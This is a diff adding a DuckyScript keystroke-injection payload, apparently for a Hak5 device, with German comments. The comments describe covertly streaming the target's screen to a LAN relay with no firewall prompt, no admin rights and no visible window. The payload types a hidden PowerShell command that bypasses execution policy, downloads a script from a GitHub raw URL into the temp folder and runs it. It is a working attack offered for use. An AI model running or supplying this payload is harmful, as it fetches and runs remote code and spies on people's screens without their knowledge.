@@ -1,0 +1,12 @@
+﻿REM Screenshare over LAN - V3 (Sender an ZimaOS-Relay)
+REM Das Ziel oeffnet keinen Port: es schickt die Bilder nur nach aussen.
+REM Keine Firewall-Frage, keine Adminrechte, kein CMD-Fenster.
+REM Ansehen auf jedem Geraet im LAN:  http://10.42.42.101:8090/
+REM Beenden: ESC auf dem Ziel 5 Sekunden halten.
+REM
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -ExecutionPolicy Bypass -w h -c $f=Join-Path ([IO.Path]::GetTempPath()) 'x3.ps1';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v3.0/s3.ps1 -OutFile $f;& $f
+DELAY 500
+ENTER
